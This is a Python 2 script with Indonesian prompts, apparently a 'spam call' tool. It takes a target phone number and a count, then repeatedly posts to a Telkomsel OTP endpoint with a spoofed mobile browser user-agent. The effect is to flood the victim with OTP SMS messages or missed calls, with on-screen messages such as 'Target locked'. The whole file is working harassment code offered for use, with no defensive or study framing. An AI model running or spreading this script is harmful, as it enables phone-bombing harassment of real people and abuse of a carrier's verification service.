#!/usr/bin/python2
# coding: UTF-8
# coded by contoh
# 15 january 2003 contoh
# open source
import requests, json, os, sys, random

qu = '\033[0;36m'
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'

def sukses(no1,pro,nam):
  print "     %s[%s%s%s] [%s Terkirim %s] %sspam %s from %s%s %ssended"%(pu,ku,no1,pu,hi,pu,pu,pro,ku,nam,hi)
def gagal(no1,pro,nam):
  print "     %s[%s%s%s] [%s Gagal  %s] %sspam %s from %s%s %snot sended"%(pu,ku,no1,pu,me,pu,pu,pro,ku,nam,me)
def main():
  print "%s[%s!%s] %sTarget locked >> %s%s"%(pu,me,pu,pu,ku,"+62"+nom)
  t = 1
  for spam in range(jum):
   t += 1
   telkomsel()

def logo():
    print """\033[31;1m  _________                      _________        .__  .__
 /   _____/__________    _____   \_   ___ \_____  |  | |  |
 \_____  \\____ \__   \  /     \  /    \  \/\__  \ |  | |  |
\033[37;1m /        \  |_> > __ \|  Y Y  \ \     \____/ __ \|  |_|  |__
/_______  /   __(____  /__|_|  /  \______  (____  /____/____/
        \/|__|       \/      \/          \/     \/


                     [\033[41;1m Author : nandana 102 \033[00;1m\033[37;1m]
                    \033[31;1m[\033[47;1m nandana \033[00;1m\033[31;1m]
        \033[00;1m
    """

def input():
  global nom
  nom = raw_input("%s* %snomor target (821xx) : "%(me,pu))
  if len(nom) < 5:
    print "%s[%s!%s] %sMasukkan nomor yang benar!!"%(pu,me,pu,me)
    input()
  elif nom.startswith(tuple(["62","+62","0"])):
    print "%s[%s!%s] %sMasukkan nomor tanpa 62, +62, ataupun 0\n%s[%s!%s] %sContoh : 82125068665"%(pu,me,pu,ku,pu,me,pu,ku)
    input()
  else:
    global jum
    jum = int(raw_input("%s* %sJumlah spam : "%(me,pu)))
    main()

def telkomsel():
  h = requests.post("https://www.my.telkomsel.com/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if json.loads(h.text)["StatusMessage"] == 'Request misscall berhasil':
   sukses("✔","sms","telkomsel")
  else:
   gagal("✖","sms","telkomsel")


if __name__ == '__main__':
 try:
  os.system("clear")
  logo()
  input()
 except (KeyboardInterrupt,EOFError): print "%s[%s!%s] %sExit"%(pu,me,pu,pu)
 except requests.exceptions.ConnectionError: exit("%s[%s!%s] %sConnection Error..."%(pu,me,pu,me))

